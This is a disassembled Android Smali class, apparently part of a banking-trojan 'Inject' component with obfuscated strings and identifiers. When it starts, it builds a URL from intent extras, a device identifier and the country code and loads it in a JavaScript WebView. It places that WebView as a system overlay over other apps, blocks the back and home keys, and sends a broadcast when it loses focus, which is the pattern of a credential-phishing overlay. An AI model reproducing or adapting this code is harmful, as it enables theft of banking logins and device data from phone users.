.class public Lcompse/refact/st/upsssss/Inject$mainActivity;
.super Landroid/app/Activity;


# instance fields
.field fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field private sdfsdfsdfsdf:Landroid/webkit/WebView;

.field private zxcvxvsdvsvsvs:Landroid/view/View;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1

    const v0, 0x7f040003

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->setContentView(I)V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/InjectProcess;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->stopService(Landroid/content/Intent;)Z

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/Notification;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 2

    const/4 v1, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    :cond_0
    return v1
.end method

.method public onKeyUp(ILandroid/view/KeyEvent;)Z
    .locals 2

    const/4 v1, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    :cond_0
    return v1
.end method

.method protected onPause()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->finish()V

    return-void
.end method

.method protected onStart()V
    .locals 6

    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "\u0002(\u0003"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "$>="

    invoke-static {v2}, Lcompse/refact/st/upsssss/fgjyukukuiki;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v0, "\u00014\u001e2\u0014"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v3

    const v0, 0x7f080005

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    iget-object v0, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v4, 0x1

    invoke-virtual {v0, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v5, 0x0

    invoke-virtual {v4, v5, v2}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, "\u0005\u001f\u0006^"

    invoke-static {v4}, Lcompse/refact/st/upsssss/fgjyukukuiki;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "sN,L"

    invoke-static {v2}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v2, p0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "W\u0000L"

    invoke-static {v2}, Lcompse/refact/st/upsssss/fgjyukukuiki;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v1}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iget-object v0, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    iput-object v0, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->zxcvxvsdvsvsvs:Landroid/view/View;

    iget-object v0, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->zxcvxvsdvsvsvs:Landroid/view/View;

    invoke-virtual {v0}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object v0

    check-cast v0, Landroid/view/ViewGroup;

    iget-object v2, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->zxcvxvsdvsvsvs:Landroid/view/View;

    invoke-virtual {v0, v2}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    const/16 v0, 0x7da

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->type:I

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "+\u00182\u00153\u0006"

    invoke-static {v2}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iget-object v2, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->zxcvxvsdvsvsvs:Landroid/view/View;

    invoke-interface {v0, v2, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iget-object v0, p0, Lcompse/refact/st/upsssss/Inject$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    new-instance v1, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-direct {v1, p0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;-><init>(Lcompse/refact/st/upsssss/Inject$mainActivity;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    return-void
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->finish()V

    return-void
.end method

.method public onWindowFocusChanged(Z)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    if-nez p1, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-string v1, "\r\u001f\u0008\u0003\u0003\u0018\u0008_\u0005\u001f\u0018\u0014\u0002\u0005B\u0010\u000f\u0005\u0005\u001e\u0002_/=#\").?(?%)<35%0 >+\""

    invoke-static {v1}, Lcompse/refact/st/upsssss/fgjyukukuiki;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Inject$mainActivity;->sendBroadcast(Landroid/content/Intent;)V

    :cond_0
    return-void
.end method
